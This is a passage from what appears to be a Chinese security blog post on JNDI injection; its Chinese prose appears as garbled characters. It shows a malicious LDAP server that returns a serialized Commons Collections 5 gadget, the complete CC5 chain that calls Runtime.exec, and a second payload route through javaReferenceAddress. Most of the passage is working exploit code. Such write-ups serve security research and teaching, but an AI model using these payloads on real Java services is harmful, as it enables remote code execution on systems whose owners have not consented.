</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sendResult</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">InMemoryInterceptedSearchResult</span><span class="w"> </span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">base</span><span class="p">,</span><span class="w"> </span><span class="n">Entry</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">LDAPException</span><span class="p">,</span><span class="w"> </span><span class="n">MalformedURLException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">URL</span><span class="w"> </span><span class="n">turl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">.</span><span class="na">getRef</span><span class="p">().</span><span class="na">replace</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="p">).</span><span class="na">concat</span><span class="p">(</span><span class="s">&#34;.class&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Send LDAP reference result for &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; redirecting to &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">turl</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;javaClassName&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Exploit&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cbstring</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">refPos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbstring</span><span class="p">.</span><span class="na">indexOf</span><span class="p">(</span><span class="sc">&#39;#&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">refPos</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">cbstring</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbstring</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">refPos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//             Payload1: åˆ©ç”¨ LDAP + Reference Factory</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            e.addAttribute(&#34;javaCodeBase&#34;, cbstring);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            e.addAttribute(&#34;objectClass&#34;, &#34;javaNamingReference&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            e.addAttribute(&#34;javaFactory&#34;, this.codebase.getRef());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//             Payload2: è¿”å›åºåˆ—åŒ– Gadget</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;javaSerializedData&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">CC5</span><span class="p">.</span><span class="na">getpayload</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">exception</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">exception</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="p">.</span><span class="na">sendSearchEntry</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="p">.</span><span class="na">setResult</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">LDAPResult</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">ResultCode</span><span class="p">.</span><span class="na">SUCCESS</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>CC5</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">ldap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC5</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">o1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getpayload</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">getpayload</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">,</span><span class="n">invokerTransformer1</span><span class="p">,</span><span class="n">invokerTransformer2</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LazyMap</span><span class="w"> </span><span class="n">fistrmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LazyMap</span><span class="p">)</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">(),</span><span class="n">keyTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">fistrmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;fistrmap&#34;</span><span class="p">,</span><span class="n">1111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TiedMapEntry</span><span class="w"> </span><span class="n">tiedMapEntry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">(</span><span class="n">fistrmap</span><span class="p">,</span><span class="s">&#34;nono&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;javax.management.BadAttributeValueExpException&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">o</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">o</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">11</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;val&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">val</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">val</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">o1</span><span class="p">,</span><span class="w"> </span><span class="n">tiedMapEntry</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">bos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">bos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">serializedData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bos</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">serializedData</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h4 id="ååºåˆ—åŒ–ç‚¹2">ååºåˆ—åŒ–ç‚¹2<a hidden class="anchor" aria-hidden="true" href="#ååºåˆ—åŒ–ç‚¹2">#</a></h4>
<p>é™¤äº†ç¬¬ä¸€ä¸ªifå¤„å¯ä»¥ååºåˆ—åŒ–ï¼Œè¿˜æœ‰ä¸€ä¸ªç‚¹å¯ä»¥</p>
<p><img loading="lazy" src="images/3eda86ed-bbea-4b55-b2c2-a8e25724d918.png" alt="serialize4.png"  />
</p>
<p><img loading="lazy" src="images/6e5bcaff-c030-4cf3-85dc-85f19a2917ab.png" alt="serialize5.png"  />
</p>
<p><img loading="lazy" src="images/6e95b71e-17aa-4b7d-8eb6-4cac9583a921.png" alt="serialize6.png"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;javaClassName&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;foo&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;javaReferenceAddress&#34;</span><span class="p">,</span><span class="s">&#34;$1$String$$&#34;</span><span class="o">+</span><span class="k">new</span><span class="w"> </span><span class="n">BASE64Encoder</span><span class="p">().</span><span class="na">encode</span><span class="p">(</span><span class="n">serializeObject</span><span class="p">(</span><span class="n">getPayload</span><span class="p">())));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;objectClass&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;javaNamingReference&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">//$NON-NLS-1$</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">result</span><span class="p">.</span><span class="na">sendSearchEntry</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">result</span><span class="p">.</span><span class="na">setResult</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">LDAPResult</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">ResultCode</span><span class="p">.</span><span class="na">SUCCESS</span><span class="p">));</span><span class="w">
</span></span></span></code></pre></div><p><strong>å‚è€ƒï¼š</strong></p>
<blockquote>
<p><a href="https://tttang.com/archive/1611/#toc__2">https://tttang.com/archive/1611/#toc__2</a></p>
<p><a href="https://exp10it.io/2022/12/jndi-injection/#%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC-jdk-%E9%99%90%E5%88%B6">https://exp10it.io/2022/12/jndi-injection/#%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC-jdk-%E9%99%90%E5%88%B6</a></p>
</blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/jdbc/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>JDBCç»¼åˆåˆ†æ</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/rmi-jep290/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>RMI JEP290</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
